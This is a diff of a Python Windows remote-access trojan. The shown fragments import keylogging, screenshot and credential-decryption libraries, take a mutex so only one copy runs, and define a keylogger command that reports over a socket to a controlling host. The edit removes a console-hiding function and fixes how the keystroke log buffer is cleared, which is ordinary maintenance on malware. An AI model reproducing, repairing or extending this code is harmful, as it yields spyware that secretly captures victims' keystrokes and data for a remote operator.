@@ -1,5 +1,5 @@
 import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard
-import win32console, win32gui, win32api, winerror, win32event, win32crypt
+import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
 
@@ -19,12 +19,6 @@ def MessageBox(message):
     objVBS.close()
     subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
 
-
-def hide():  # hide window
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window, 0)
-    return True
-hide()
 
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
@@ -314,7 +308,7 @@ def keylogger(option):
         if KeyListener.running:
             KeyListener.stop()
             threading.Thread.__init__(KeyListener)  # re-initialise the thread
-            del strKeyLogs
+            strKeyLogs = ""
             objSocket.send(str.encode("success"))
         else:
             objSocket.send(str.encode("error"))
